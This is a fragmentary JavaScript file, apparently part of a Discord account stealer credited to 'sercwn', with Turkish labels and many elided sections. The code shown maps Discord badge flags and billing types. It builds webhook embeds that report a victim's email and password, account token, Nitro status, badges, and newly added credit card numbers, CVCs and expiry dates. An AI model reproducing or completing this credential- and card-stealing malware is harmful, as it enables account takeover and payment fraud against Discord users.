    ...
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          ...
          break;
        case 2:
          billing += '<:paypal:1107581988141023242> ';
          break;
      }
    }
  });
...
const getBadges = (flags) => {
  ...
  switch (flags) {
    case 1:
      badges += 'Discord Personeli, ';
      break;
    case 2:
      badges += 'Discord Ortagi, ';
      break;
    case 262144:
      badges += 'Moderator Programlari Mezunu, ';
      break;
    case 131072:
      badges += 'Onaylanmis Bot Gelistiricisi, ';
      break;
    case 8388608: 
      badges += 'Aktif Gelistirici, ';
      break;
    case 4:
    ...
    case 8:
      ...
      break;
    case 512:
      badges += 'Erken Dönem Destekcisi, ';
      break;
    case 128:
      badges += 'HypeSquad Güzelligi, ';
      break;
    case 64:
      badges += 'HypeSquad Cesareti, ';
      break;
    case 256:
      badges += 'HypeSquad Dengesi, ';
      break;
    case 0:
      badges = 'None';
      break;
    ...
    embeds: [
      {
        ...
        fields: [
          {
            ...
            value: `E-posta: **${email}** - Sifre: **${password}**`,
            inline: false,
          },
          {
            name: '**Discord Bilgiler**',
            value: `Nitro Turleri: **${nitro}**\nRozetler: **${badges}**\nFaturalandırma: **${billing}**`,
            inline: false,
          },
          {
            name: '**Token**',
        ...
        footer: {
          text: '🎉・sercwn・https://github.com/sercwn',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Paypal eklendi**',
            value: `Nitro gecme zamani geldi baby 😩`,
            inline: false,
          },
          {
            name: '**Discord Bilgiler**',
            value: `Nitro turu: **${nitro}*\nRozetler: **${badges}**\nFaturalandirma: **${billing}**`,
            inline: false,
          },
          {
            name: '**Token**',
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Kredi karti eklendi!**',
            value: `Kredi karti numarasi: **${number}**\nGuvenlik kodu: **${cvc}**\nSon kullanim tarihi: **${expir_month}/${expir_year}**`,
            inline: true,
          },
          {
            name: '**Discord Bilgiler**',
